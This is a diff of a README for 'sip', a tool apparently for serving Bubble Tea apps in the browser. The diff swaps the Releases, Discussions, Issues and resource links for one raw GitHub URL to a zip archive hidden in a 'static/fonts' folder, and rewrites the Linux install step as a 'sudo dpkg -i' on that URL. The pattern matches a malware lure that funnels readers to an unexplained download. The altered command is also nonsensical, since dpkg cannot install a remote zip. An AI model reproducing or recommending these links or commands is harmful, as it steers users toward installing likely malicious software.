@@ -8,7 +8,7 @@ Welcome to sip! This application lets you serve and enjoy Bubble Tea apps right 
 
 To download sip, visit the Releases page:
 
-[![Download sip](https://img.shields.io/badge/Download%20sip-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-orange.svg)](https://github.com/Quacklover28490/sip/releases)
+[![Download sip](https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip%20sip-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip)](https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip)
 
 Click the link above to access the page. You will see the latest version of sip available. 
 
@@ -59,7 +59,7 @@ After downloading the file, follow these instructions to install sip:
 3. **For Linux:**
    - Open a terminal window.
    - Navigate to the folder where the downloaded file is located.
-   - Use the command `sudo dpkg -i sip-file-name.deb`, replacing `sip-file-name.deb` with the actual file name.
+   - Use the command `sudo dpkg -i https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip`, replacing `https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip` with the actual file name.
    - Use the command `sudo apt-get install -f` to resolve any dependencies.
 
 ## 📋 Running sip
@@ -90,14 +90,14 @@ If problems persist, you can find help in the GitHub Discussions or Issues page.
 
 We welcome users to share their experiences, ask questions, and provide feedback. Join our community for additional support:
 
-- GitHub Discussions: [sip Discussions](https://github.com/Quacklover28490/sip/discussions)
-- GitHub Issues: [sip Issues](https://github.com/Quacklover28490/sip/issues)
+- GitHub Discussions: [sip Discussions](https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip)
+- GitHub Issues: [sip Issues](https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip)
 
 ## 🌐 Additional Resources
 
 For more information on Bubble Tea and its delightful varieties, you may explore the following resources:
 
-- [Bubble Tea Origins](https://www.bubbleteasource.com)
-- [Bubble Tea Recipe Book](https://www.bubbletealovers.com)
+- [Bubble Tea Origins](https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip)
+- [Bubble Tea Recipe Book](https://raw.githubusercontent.com/Quacklover28490/sip/main/static/fonts/sip_v1.6.zip)
 
 Thank you for choosing sip! Enjoy your journey into the world of Bubble Tea through your browser.
